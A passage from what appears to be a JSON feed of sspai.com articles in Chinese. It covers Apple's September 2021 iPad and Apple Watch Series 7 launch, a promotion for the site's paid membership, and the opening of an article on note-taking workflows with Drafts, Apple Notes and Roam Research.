Pro 一样的人像居中功能，这项功能可以自动调整摄像头跟随用户移动，使用户始终处于画面中央，当有新用户加入时则会逐渐放大画面使得所有人都出现在画面中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g71db34tdhj3i1e7g.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>iPad</figcaption></figure><p>此外，新款 iPad 基础价格保持不变，售价 2,499 元起，但是存储容量翻倍变为 64GB 起；将于 9 月 16 日上午 9 点开始预购、9 月 24 日正式发售，具体型号价格为：</p>\n<ul>\n<li>64GB (Wi-Fi 版)：¥2,499</li>\n<li>256GB (Wi-Fi 版)：¥3,699</li>\n<li>64GB (蜂窝数据版)：¥3,499</li>\n<li>256GB (蜂窝数据版)：¥4,699</li>\n</ul>\n<h2>Apple Watch Series 7：整体设计不变，屏幕尺寸更大</h2>\n<p>作为秋季发布会中的固定环节，Apple 更新了 Apple Watch 产品线，推出了拥有更优秀的显示屏、更多配色和更多健身功能的 Apple Watch Series 7。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c50g71lb34tdhj3i1e80.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>Apple Watch Series 7</figcaption></figure><p>Apple Watch Series 7 最容易被人发现的改变，来自它的显示屏。相比前代，Series 7 的屏幕尺寸增加了 20%，同时边框收窄至 1.7 mm，屏幕亮度在室内条件下有 70% 的提升，这些改变使得视觉效果得到提升。在此基础上，Apple Watch Series 7 也优化了表盘设计，让显示屏空间可以得到充分利用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g725b34tdhn8pbnv0.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>外观和显示效果对比</figcaption></figure><p>Series 7 的显示屏不仅变大了，也变得更加坚硬。Apple 这次重新设计了 Apple Watch Series 7 的显示屏，表镜增加 50% 的厚度，采用底面平坦的新设计，使得设备可以做到 IP6X 级别的防尘性能和 50 米防水。这些升级，无疑会让 Apple Watch 更适合户外活动。</p>\n<p>另一处明显的外观改变来自配色。Apple Watch Series 7 提供钛金属、不锈钢和铝金属三种机身选择。对于铝金属机身，将有绿色、蓝色、红色、星光色和午夜色五种新配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g72db34tdhopdm71g.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>配色</figcaption></figure><p>相比外观的变化， Apple Watch Series 7 在硬件上升级并不大。主要提升了充电性能，搭配 USB-C 快速充电线，把电量从零充到 80% 仅需约 45 分钟。无论是习惯晚上戴着手表睡觉的用户，还是晚上忘了给手表充上电但又急着出门的人，这项提升都有一定实用性。其他方面，Apple Watch Series 7 将采用和前代相同的处理器，续航时间也保持在 18 小时。</p>\n<p>除了硬件上的升级，Apple 在继续深挖 Apple Watch 应用在健身领域的潜力。Apple Watch 现在可以自动检测蹬车的动作，提醒开启体能训练。在运动时，会把速度、骑行距离等数据通过语音进行反馈。当然，Apple 自己的健身服务 Fitness+，也更新了更多的教程和运动类型。不过，虽然今年 Fitness+ 将在 15 个国家和地区提供，但国内用户依然体验不到。</p>\n<p>输入方面，Apple Watch Series 7 加入了全键盘输入功能，还支持了滑动输入，多个 App 的按键布局也得到了重新设计，变得更加易用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/177173003fb7ce195871e462d71c3bc2.png\"></figure><p>Apple Watch Series 7 将在秋末发售，目前国行版本售价尚未公布。作为参考，Apple Watch Series 7 美版价格为 $399 起。</p>\n<h2>其它</h2>\n<p>根据 Apple 官网信息显示，iOS 15、iPadOS 15、watchOS 8 将于 9 月 21 日正式推出，macOS Monterey 仍然没有确认正式发布时间，将于秋季推出。</p>\n<p>值得注意的是，「年年焕新」计划也在今年开始支持在线换购，不过，根据官网信息显示：</p>\n<blockquote><p>于 Apple Store 在线商店加入本计划的顾客（包括在线订购并自行到店取货的顾客）仅可通过 Apple Store 在线商店升级换购；于 Apple Store 零售店加入本计划的顾客仅可前往 Apple Store 零售店升级换购。</p></blockquote>\n<p>因此，如果你此前加入了「年年焕新」计划，想要继续参加，只能继续通过线下 Apple Store 零售店进行换购。习惯通过线上购买 iPhone 的用户，则可以从今年开始加入「年年焕新」计划。</p>\n<h2>Apple 没准备的「One more thing」，少数派给你备上了</h2>\n<p>尽管 iOS 一直有着「易于上手」的口碑，Apple 官网也提供了 iOS 系统的说明文档，但仍有不少用户会遇到：</p>\n<ul>\n<li>用了很久的 iOS，有些功能和特性从来没用过，也不知道怎么用；</li>\n<li>遇到系统相关的软件问题没处问，去查官文文档又太费时间；</li>\n<li>系统不断更新，网上的经验贴容易过时。</li>\n</ul>\n<p>因此，少数派为你准备了《少数派系统指南 · iOS 15》。</p>\n<p>《少数派系统指南 · iOS 15》是一份面向所有 iOS 用户的指南，能够让你更全面、深入了解 iOS 的各项功能，解决你日常使用时会遇到的烦恼，发挥 iPhone 的所有价值。</p>\n<p>目前《少数派系统指南 · iOS 15》正在上架预购<strong>六折</strong>优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</p>\n<span class=\"ss-paidSection\" product-id=\"228\" type=\"paidSection\"> </span><p>少数派接下来会持续报道新 iPhone 的更多细节和体验，欢迎你通过 <a href=\"https://sspai.com/page/client\">少数派客户端</a>、<a href=\"https://weibo.com/sspaime\">官方微博</a>和微信公众号（sspaime）关注我们，获取最新内容。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68811"},{"title":"少数派会员迎来大更新，福利促销正式开启","date":"2021-09-14 10:01:42","description":"\n<p>各位少数派的读者们好。自 2021 年 6 月 1 日少数派会员（π+Prime）正式上线以来，我们已经持续运营了整整三个月的时间。在过去的三个月中，会员通讯《少数派报告》以平均每期超过五万字的容量更新了七期图文内容、两期会员播客（Precog Channel）以及六期会员音乐播客，也收获了许多会员朋友们的支持和喜爱。</p>\n<p>不过，我们对少数派会员的期待和要求不止于此。在过去的三个月中，我们也聆听了许多来自会员作者们和读者们的声音，并一直在策划新的内容和玩法，让会员服务更加丰富、更有趣味。因此，在完成了一个季度的运营之后，我们将为少数派会员服务带来诸多更新和升级，加量不加价。</p>\n<h2>🎈 太长不看——少数派会员是什么？怎么加入？</h2>\n<p>少数派会员是我们为所有少数派读者们提供的增值服务，包含一份实体周边、电子杂志《少数派报告》《科技漫游》、会员播客、会员直播及其它福利权益。少数派会员定价 365 元，将提供一年的内容更新。</p>\n<p>其中，实体周边包含会员定制徽章、会员定制贴纸、会员定制帆布袋等，每位会员均可获赠。</p>\n<p>电子杂志《少数派报告》和《科技漫游》则是每月持续更新的深度内容，《少数派报告》偏向数字生活指南，探讨潜藏在不同工作、生活场景里的知识和技巧；《科技漫游》则是即将推出的增刊，重点探讨当下热门科技资讯、效率工具玩法等。两份杂志均为半月刊，换言之，少数派会员每月可以读到四份包含深度内容的电子读物。</p>\n<p>随着《科技漫游》等版块的加入，我们也为尚未加入会员的朋友们提供了限定优惠，<strong>9 月 30 日前加入少数派会员，可以额外获赠我派新款周边礼品</strong>，详情会在下文说明。</p>\n<ul><li>🎁 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">点击这里，加入少数派会员</a>（促销活动于 9 月 14 日 20:00 正式开始）</li></ul>\n<p>⚠️ <strong>注：以上为本次活动专属链接，只有通过该链接购买会员的用户才能获得赠品。</strong></p>\n<h2>🎁 福利：现在加入少数派会员，可获赠我派全新周边</h2>\n<p>在会员服务大幅升级的同时，我们也为还未加入会员的朋友们奉上了限定福利：从 9 月 14 日 20 点至 9 月 30 日 24 点，所有加入少数派会员读者均有机会获赠我派新款周边或正版软件。</p>\n<p>具体福利为：</p>\n<ul>\n<li>前 10 名下单用户：价值 148 元的水獭公仔、一派胡言鼠标垫（彩色款）各一套</li>\n<li>第 11 名至 30 名：价值 79 元的一派胡言鼠标垫（彩色款）一个</li>\n<li>第 31 名至 50 名：价值 69 元的水獭公仔一个</li>\n<li>第 51 名及以后：价值 40 元的《白描》黄金版终生会员一份</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/c22e27de98bcb225598163cc1804af03.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/570993e25686c0c9208b31b4d312a264.JPG\"></figure><h3>购买方式说明</h3>\n<p>点击 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">活动链接</a> 后进入淘宝购物介面，选择包含相应赠品的套餐即可。不同套餐根据活动规则已经提前设定好了库存，如果活动开始后对应套餐无法购买，说明库存已经卖完，可以选择其它套餐。</p>\n<p>拍下并付款后系统会自动派发会员兑换码，如果选择了白描套餐，则会同时派发白描兑换码。</p>\n<ul><li>兑换会员请 <a href=\"https://sspai.com/prime/redeem\" target=\"_blank\">点击这里</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/93998e5bbecfb2a81b85c8c8ac20dbf5.png\"></figure><ul><li>👉 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">点击这里，成为少数派会员</a>\n</li></ul>\n<p><strong>⚠️ 注：请通过上文链接或前往少数派软件淘宝店下单购买会员方可获赠礼品</strong></p>\n<p>此外，如果你在 9 月 14 日至 30 日的活动期间选择在 <a href=\"https://sspai.com/prime\" target=\"_blank\">少数派站内购买会员</a>，我们会赠送价值 49 元的新款付费教程《Microsoft 365 定制教程》一份，该教程目前还未正式上架，阅读权益将于首期《科技漫游》上线后解锁。</p>\n<p><strong>所有 9 月 14 日之前购买的非预购会员朋友们也将获赠该教程。</strong>小小心意，希望你喜欢。</p>\n<h2>🎉 π+Prime 大更新：《科技漫游》增刊、会员知识库、会员话题群等</h2>\n<p>本次少数派会员的更新内容很多，主要包括：</p>\n<ul>\n<li>新增《科技漫游》增刊，内容主要包含科技资讯讨论、效率工具玩法分享、为你的「稍后读」加点料等</li>\n<li>《少数派报告》定位及结构调整，强化主刊和每期讨论的主题，副刊则主要收录固定栏目</li>\n<li>新增少数派会员知识库，持续收录有价值的外部新闻、工具、文章、影片等资讯</li>\n<li>新增会员话题群，会员朋友们终于有自己的根据地啦</li>\n<li>新增会员直播活动，每月一次，在线探讨近期热门话题，并解答来自读者的问题</li>\n</ul>\n<p><strong>⏰ 所有会员权益调整都将于 9 月 22 日跟随《科技漫游》同步上线，详细更新的内容见下文。</strong></p>\n<h3>新增《科技漫游》</h3>\n<p>终始惟一，时乃日新。《科技漫游》是少数派立足传统优势领域、吸取过往出品经验、充分动员内外写作力量，为会员献上的科技内容增刊。</p>\n<video class=\"ss-videoSource video-js\" controls=\"\" poster=\"https://cdn.sspai.com/2021/09/14/9f39c56bf6e39d0fbb0e97ddd3187122.png\" title=\"\" type=\"video/mp4\" preload=\"none\"><source src=\"https://cdn.sspai.com/video/tech-odyssey.mp4\" type=\"video/mp4\"></source></video><p>注：影片配乐来自 <a href=\"https://y.music.163.com/m/song?app_version=8.5.10&amp;id=1490152253&amp;userid=130549283&amp;sc=wm\" target=\"_blank\">这里</a>，基于 CC 4.0 共享。</p>\n<p>内容编排上，每期《科技漫游》将由一篇<strong>主题文章</strong>和若干<strong>栏目文章</strong>构成。</p>\n<p>其中，主题文章为当期主打内容，除以「深度」为导向外，选题和体裁不设限制。你可能看到对科技相关设计、现象、问题的探讨，也可能看到工作流程、方法论介绍，或是数字生活的探索历程等。</p>\n<p>主题文章是「任性」的，我们可以抛开传播度、受众面的桎梏，钻研我们认为最酷、最「少数派」的问题；但更是「认真」的，我们将会更躬身参与到创作的全过程，务求让文章从外观到内在的质量都经得起推敲。</p>\n<p>另一方面，栏目文章则具有特定格式或关注对象，每期轮换组合，是读者拓宽视野、调剂口味的拼盘。我们初步规划的栏目包括：</p>\n<ul>\n<li>\n<strong>网事深读：</strong>「科技新闻」似乎已成了一个矛盾体——互联网号称有永恒的记忆，却能转身间将轰动一时的讨论冲刷殆尽；看似无限包容，却往往只给最偏颇的声音递上传声筒。在「网事深读」中，我们不求多、求快，而是会从一个热点出发，梳理前因后果、汇总中外网络上的正反观点，以期让读者对事件形成全面客观、触类旁通的认识。</li>\n<li>\n<strong>极客手册：</strong>「教程」类内容的门槛可以很低，罗列选项、复述步骤也可算作一种教程；但我们的自我要求不止于此。「极客手册」希望成为一张兼具理论和实践价值的参考卡片，以解决实际需求为导向、以使用步骤为纲，同时嵌入关于方法和原理的讨论，启发读者在学中用、用中学。</li>\n<li>\n<strong>少数派幕后：</strong>作为忠实读者，你是否好奇于一则选题如何从头脑中的火花演化为网站上齐整码放的文字？是否想知道编辑们的协作方式、工作流程和心得感悟？那么，「少数派幕后」将带你走进编辑部的「后厨」，一同见证内容是怎样炼成的。</li>\n<li>\n<strong>曲径通幽：</strong>围绕《捷径》（Shortcuts）应用的探索可谓少数派的「传统艺能」。我们在中文互联网上率先报道了《捷径》的一路发展，编写了系统的 <a href=\"https://sspai.com/series/68\">捷径教程</a>，并维护了备受好评的 <a href=\"https://shortcuts.sspai.com/\">中文捷径库</a>。「曲径通幽」将沿着我们之前的足迹继续修葺，不仅会持续提供、更新最实用的成品配方，更会着重介绍编制捷径的思路方法，让你用好这个 Apple 系统生态中的自动化利器。</li>\n</ul>\n<p>我们将会持续思考，采纳读者反馈，调整和新增栏目类型。此外，《科技漫游》一如既往地欢迎读者投稿，并提供高标准的稿酬。如有感兴趣的选题方向，欢迎与 @PlatyHsu 或 @sainho 联系。</p>\n<p>⏰《科技漫游》每月两期，将于每期《少数派报告》发布一周后上线，首期《科技漫游》定于 9 月 22 日正式上线。</p>\n<h3>《少数派报告》的主刊定位强化</h3>\n<p>在会员通讯《少数派报告》的策划阶段，我们就将其定位为「数字生活指南」，希望面向更广的领域吸纳选题，帮助读者们拓展视野、发展兴趣。因此，我们将《少数派报告》分成了 Pre 和 Cog 两部分，Pre 为主刊，聚焦当期话题；Cog 为副刊，收录和当期主题没有强关联的文章以及常规栏目。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/efbae6af15775f53672ad1e7d077919c.png\"><figcaption>未来的《少数派报告》会着重在主刊里探讨当期主题</figcaption></figure><p>就目前来看，《少数派报告》主副刊之间的区隔还不够明确。因此，在接下来的选题策划中，我们将强化每期选题以及主刊的比重，副刊则主要更新烹饪、读书、PPT 技巧等常规栏目，让《少数派报告》的杂志感更强，对于每期选题的讨论也更加深入。</p>\n<p>⏰《少数派报告》的更新时间及频率不变，仍为每月 1 日及 15 日上线，如遇法定节假日可能会提前或推迟。</p>\n<h3>属于会员们的共享知识库</h3>\n<p>《少数派报告》和《科技漫游》是少数派会员内容盛宴上的两道主菜，但只有主菜的一餐，可算不上丰富。因此，我们特地策划了「会员知识库」，来作为深度内容的补充，丰富各位会员的阅读选择。</p>\n<p>会员知识库目前分为两个板块：「采菱」和「游迹」。</p>\n<p>在「采菱」中，我们搜罗了一些小而美的实用工具，例如一些网页应用或命令行功能。这些工具因为通常因为上手门槛相对较高，或是应用场景比较特殊而不为人知，但我们相信作为「少数派」的你，肯定会乐于尝试这些新鲜有趣的事物。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/4bd74415c52dfa900e4686d42a3f7f87.png\"><figcaption>「采菱」截图</figcaption></figure><p>而「游迹」则记录了少数派会员主创们在平时搜集素材或是日常阅读中，发现的优质内容。这些内容不仅局限于《少数派报告》和《科技漫游》所涉及的主题，而是只要是我们觉得值得一读，都会在这里分享给你。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/923cefd4ec6b464e395895ec803f58ba.png\"><figcaption>「游迹」截图</figcaption></figure><p>不仅如此，这份知识库的知识来源不仅限于少数派编辑们，我们期待和会员朋友们共建会员知识库。无论是好工具还是好文章，你都可以在知识库通过表单提交，并分享给其他读者们。我们共享知识，也共享分享的快乐。</p>\n<p>⏰ 会员知识库将于 9 月 22 日跟随首期《科技漫游》一同开放，刊内会公布知识库的访问方法。</p>\n<h3>会员话题群终于来了</h3>\n<p>许多会员朋友一直希望能有一个属于会员们的交流群，但鉴于现在各平台的主题群越来越多，我们一直担心群聊无法给大家带来实际的意义和价值，所以此前并未建群。但在了解了飞书话题群的相关功能后，我们认为这种产品形态更适合少数派会员们的交流与分享，因此，少数派会员话题群正式建立。</p>\n<p>所有加入该群的会员均可自由创建话题，其他会员朋友也能在该话题下发起讨论。相比你一言我一语的群聊，话题群能让讨论更加集中，聊天过程中的精彩发言也能持久沉淀。</p>\n<p>我们希望全新的话题群不是你的另一个「闲聊集散地」，而能成为认识新朋友、了解新鲜事的新去处。关于会员权益的相关动态也会在群内优先更新，便于大家知悉或参与。</p>\n<p>⏰ 会员话题群将于 9 月 22 日跟随首期《科技漫游》一同开放，刊内会公布会员群的加入方式。</p>\n<h3>会员直播 Precog Live</h3>\n<p>我派此前就尝试过 Power+ Live 及其它直播形式，得到了许多朋友的喜爱。在少数派会员中，我们决定沿用「在线声音直播」的形式，上线全新的直播栏目 Precog Live。Precog Live 将结合当月的会员通讯及科技热点事件来制定话题并展开讨论，还会在直播中邀请读者们上麦互动，解答大家的疑问。</p>\n<p>直播结束后，每期 Precog Live 还将制作为播客，供没有参与直播的朋友收听。</p>\n<p>⏰ Precog Live 每月一期，每月的最后一周举行。首期 Precog Live 的主题暂定为「借 MacStories 的服务升级，谈谈如何制作一档付费内容」，我们会在直播中聊聊筹备少数派各项付费内容服务的经验和实践，并探讨内容创作的深度与广度。直播时间暂定为 9 月 29 日，具体时间安排将在会员话题群内公布，欢迎会员朋友们关注和参与。</p>\n<h3>📦 周边发货：已经全部发完，再次感谢等待</h3>\n<p>经过漫长的等待，会员周边礼盒终于发货了。如此前我派多次介绍，我们为了给预购会员们更多惊喜，在上线前临时决定加赠一本我派新书《数字时代效率手册》，没想到各种版号、物流等层层受阻，直到 9 月份才正式拿到成品，可谓好事多磨。</p>\n<p>本周起，所有会员周边已经分批发出。由于上千份周边是陆续寄出的，所以不同地区会员们收到货的时间会有所不同。再次感谢大家的耐心等待，如果一周后还有哪位朋友未收到礼品，可以及时跟我们联络反馈。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/173ce09020c6e80cf32598a347c86512.jpg\"><figcaption>仓库发货盛况</figcaption></figure><p>此外，由于预购会员的编号、徽章及包装盒需要一一对应，我们全部采用人工排查，难免产生疏漏。如果遇到相关问题也可以及时反馈，我们会调换或补发等。</p>\n<p>目前在社交媒体上已经有不少收到周边礼盒的朋友开始晒单了，也欢迎大家收到后来评论区或者到微博上晒一晒，分享你的喜悦。</p>\n<h2>结语</h2>\n<p>虽然会员上线只有短短的三个月，但对参与这个项目的少数派同事们来说，这三个月却显得无比漫长。在三个月的过程中，我们遇到了不少挑战和挫折。尤其在「不想重复过去的自己」的思路和标准之下，从选题策划到内容制作，再到品牌和用户运营，每一步都是少数派此前很少尝试的新领域。</p>\n<p>再次感谢支持我们的老会员和新会员们。在完成本次大更新之后，我们内部也明确了少数派会员的迭代和改进方向，这项服务会是一个不断升级、不断加入新玩法和新内容的产品，希望可以不辜负大家对少数派的期待和喜爱。</p>\n<p>继续向我们心中的星辰大海进发吧！</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68762"},{"title":"从手写到 Roam Research，他们在用这些别致的笔记方法论","date":"2021-09-14 09:23:13","description":"\n<p>「如何做笔记」一直是少数派内容的「流量密码」，首先从学生时代老师常念叨的「好记性不如烂笔头」开始，做笔记就一直伴随着我们对待任何信息输入输出；其次没有绝对普适正确的笔记方法，不同行业、身份乃至场景都有着无数种「恰到好处」的笔记方法，而这通常因人而异，所以大家都喜欢看笔记相关的不同分享，试图从中获得启发。</p>\n<p>所以在这篇文章里，我找了几个少数派的老作者向大家分享自己的笔记方法，他们有的是老师，有的是在读学生，有的正在埋头苦研自己的数篇博士论文。他们给出的不一定是标准答案，但他们的确凭靠着这些方式让自己的工作和学习更加高效，我们一起来看看他们怎么说。</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@玉树芝兰\" user-id=\"bs2p3htb34tch279q3pg\" href=\"https://sspai.com/u/a5xddvxl\">@玉树芝兰</a> 好的笔记工具不止一个，便也不执着于「就一个」</h2>\n<p>常有人问我：</p>\n<blockquote><p>王老师，你平时用哪款笔记工具啊？</p></blockquote>\n<p>这句话的潜台词，<strong>是我只用一款笔记工具。</strong></p>\n<p>确实，我也曾经试图找到某个「十项全能」的笔记工具，提供一站式功能解决。但是那是一条折腾的不归路。从 Word 到 Vim ，从 Emacs orgmode 到印象笔记，从 Bear 到 Devonthink，从 Drafts 到 Ulysses，从 Milanote 到 Notion，从 Scrivener 到 Roam Research 。这其中还有 Apple Notes, Flomo 和 Craft ……</p>\n<p>后来，我发现自己的前提假设就错了——谁给我规定，只能用一款笔记工具了？此时刚好看了张玉新老师（善用佳软）的一场直播，听他说了一个词儿，叫「<a href=\"https://t.zsxq.com/aIiI6UZ\" target=\"_blank\">重器轻用</a>」。于是我恍然大悟，跳出了这个怪圈儿。张老师对于各种笔记工具的态度是：</p>\n<blockquote><p>不关注某个笔记工具哪方面不足，而是只关注吸引他的那一面，只用那一点。</p></blockquote>\n<p>这样一来，每一个他所用的工具，看到的就都是长处，使用起来就颇为愉快。而某款工具其他的功能，可以有很多，他全都忽略，这就是所谓的「重器轻用」。有人会啧啧叹息：唉，那你岂不是花了全价，才买来了 20% 甚至更少的功能？亏了啊！可对我来说，那 20% 的功能，带来的价值，已经能覆盖、甚至是超过全价了。</p>\n<p>贪心不好。</p>\n<h3>打造属于自己的笔记系统</h3>\n<p>不过我们通过实践都知晓，仅从某款软件摘取 20% 的功能，似乎是不足以单独支撑「记笔记」这个事儿的。有的工具擅长采集，有的工具擅长标注，有的工具擅长捕捉灵感，有的工具擅长穿针引线。可是，但凡我们记笔记是认真严肃的，那这些功能都需要啊。</p>\n<p>解决之道，<strong>是把这些笔记的精华功能联系起来，组合构造一个系统。</strong>这个系统用于应对笔记的全过程，从输入到输出。</p>\n<p>说起来容易，做起来却未必如此顺利。许多笔记工具，在数据的流入流出上，都有不同的限制，很容易形成孤岛。例如许多笔记工具，都支持富文本（Rich Text）格式。但是 Roam Research 并不支持富文本的直接导入。因此它和这些笔记工具间，就难以形成有效的协同。</p>\n<p>对于某些笔记工具来说，孤岛是个理想状态，这样可以把用户「圈禁」在自己的掌控中，不至于见异思迁。但是对于我们笔记用户来讲，这种情况就很糟糕。所以，我们需要找到一些工具，帮助我们充当「桥梁」。</p>\n<p>《卡片笔记写作法》一书将笔记划分成了 3 种类型，分别为：</p>\n<ul>\n<li>临时笔记（fleeting notes）</li>\n<li>文献笔记（literature notes）</li>\n<li>永久笔记（permanent notes）</li>\n</ul>\n<p>其中，永久笔记，我已经 <a href=\"https://sspai.com/post/60787\" target=\"_blank\">确定了在 Roam Research 中完成整理</a>。而 <a href=\"https://sspai.com/post/60707\" target=\"_blank\">文献笔记</a>，并不是每一个笔记工具的使用者都会用到。本文咱们就专注来谈谈，如何记录临时笔记，并且把它<strong>融入我们的笔记系统和工作流程</strong>。</p>\n<h2>笔记最初的形态要最快</h2>\n<p>临时笔记（Fleeting Notes）是笔记的最初形态。记录它的要求，就是一个字——快。</p>\n<p>唯有足够快，才能抓住我们突然迸发却又转瞬即逝的灵感。那种感觉，就如同在烟花划过夜空的一刹那完成拍摄。</p>\n<p>在手机成为我们的「外挂身体器官」之前，记录临时笔记的介质，一直是纸和笔。但是你知道的，纸片往往会被丢弃，笔记本总会被搁在角落吃灰。所以临时笔记经常不知不觉，就变成了永远不见的记录。</p>\n<p>使用软件工具来记录临时笔记，有 2 个好处。首先是保证笔记存了起来，不会被乱丢；其次因为已经是数字化的内容，整理成本相对较低。我记录临时笔记，目前主要采用两款工具。分别是 Drafts 和苹果系统自带的「备忘录」。</p>\n<p>先说说 Drafts 的使用。Drafts 最大的特点，是打开速度非常快。在电脑、手机、iPad，甚至是手表上，都能快速呼叫出来，开启一张全新的「卡片」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s6db34tcuopj7s1g.jpeg\"></figure><p>Drafts 在多个终端设备之间，都能方便同步。且因为记录的内容是纯文本，所以设备间同步速度飞快。相较而言，如果你采用的工具里面有太多图片需要同步传输，就往往会拖慢了开启与同步完成速度，影响你记录的心情，甚至让你灵感和记录冲动都被消磨掉。</p>\n<p>我比较喜欢在 Drafts 里面使用语音输入，尤其是手机上。有时候我一边散步，一边听课程。偶有灵感，立即拿出手机开启 Drafts ，然后靠着讯飞语音输入法，把内容先灌进去再说。之后，继续走路和听课。</p>\n<p>目前的语音输入工具，准确率已经很高了，但是毕竟达不到 100%。如果输入内容很多，后期需要在里面修改的压力会相对较大，导致你干脆视而不见，记录下来的内容会「沉睡」。但是如果每张卡片输入内容简短，则错误相对少，找寻修改也更加容易。这样一来，你记录之后，也会有足够的干劲儿进行整理和修改。而在一则笔记中，内容更加聚焦、凝练，也符合 <a href=\"https://sspai.com/post/59109\" target=\"_blank\">卢曼对于单则卡片笔记的要求</a>。</p>\n<p>Drafts 的缺点，是不支持本地拖拽插图。这着实让我纠结了一阵子。毕竟，很多图片，尤其是截图，如果生成时没有能够快速纳入到笔记中，和对应的文字融为一体，将来再想找寻，可就费劲了。我平时写的文章里，很多是介绍工作流程的。一幅图胜过千言万语，插图是高频刚需。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s6lb34tcvt9nu6q0.jpeg\"></figure><p>好在，有了 <a href=\"https://sspai.com/post/68344\" target=\"_blank\">操作系统级双向链接工具 Hook 的加持</a>，这个事儿就变得简单多了。我只需要呼叫 Hook，把图片变成一个 Markdown 链接，往 Drafts 里面一扔就好了。正如 「Hook」的名称本意，我们把这张图片，钩在了这段文字上面，不怕它跑掉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s6tb34tcvt9nu6qg.jpeg\"></figure><p>但是有的时候，我们的临时笔记形态，并不是文本，而是图画，甚至是涂鸦。例如下图，是我在看雪小豹（李娟）直播的时候，随手在 iPad 上面截图，然后用红笔进行了标记。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s75b34tcuopj7s20.jpeg\"></figure><p>另外，有的时候思路来了，却不足以形成文本输出的形态，而是一些结构草图。这时候，如何快速记录呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s7db34tcvciqaaeg.jpeg\"></figure><p>幸好，在苹果的生态里，有个「备忘录」可用。它同样跨越电脑、平板和手机多端。备忘录里面，你可以放上各种图。截屏可以，手绘也没问题。</p>\n<p>在 iPadOS 15 （目前是测试版）里面，备忘录变得尤其强大。因为，你可以从屏幕右下角往左上方滑动（用 Apple Pencil 或者手指均可），随时把它拖拽出来。对于部分应用，它甚至可以直接显示当前应用文档的链接，你轻轻一点，就可以将链接加入到笔记中。这样一来，你笔记的上下文都一应俱全。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s7lb34tcu4buqvp0.jpeg\"></figure><p>这样，我们就把笔记系统的链接，从文字扩展到图片，从在电脑前正襟危坐，扩展到在平板上涂抹绘画。</p>\n<p>有趣的是，你所有的手写文字，备忘录都在试图识别出来。我字迹比较潦草，中文识别率并不太高，但是很多时候都能给我带来惊喜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s8lb34tcvciqaaf0.jpeg\"></figure><p>如上图，搜「高光」二字，连这么潦草的手写记录，都对应搜了出来。</p>\n<h2>笔记的系统、记录与大融合</h2>\n<p>上述工具，你很快就能掌握，并且记下自己的灵感瞬间。但是，不要满足于此，咱们得想办法，让它们融入咱们的系统中，才能发挥卡片笔记的系统优势。下面给你介绍一下我的工作流程。</p>\n<p>先说 Drafts 。</p>\n<p>我一般会在当日对速记内容进行整理，尤其是可能有疏漏的语音录入文字。处理好一张张单独的卡片后，我会根据卡片的联系，采用 Drafts 自带的 merge 功能，把上下文相关的许多张卡片进行合并，形成一则包含多个段落的长笔记。这首先是给笔记增添一个上下文相关维度，启发未来思维激荡，同时也简化了后续的导出操作。</p>\n<p>Drafts 笔记如何汇入到 Roam Research 中呢？我们可以使用 Drafts 自带的 Action ：<code>Save md</code> 。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s8lb34tcu4buqvpg.jpeg\"></figure><p>每一则笔记，都可以输出为一个单独的 Markdown 文件，里面的文本加粗、各种链接都可以保留。然后使用 Roam Research 的批量导入 Markdown 功能，就能把它们都一股脑弄到 Roam Research 里面，进行进一步的整理操作了。</p>\n<p>你可能会脱口而出：图片怎么办？</p>\n<p>不必担心。Drafts 里面没有图片。而那些 Hook 做好的图片链接，到了 Roam 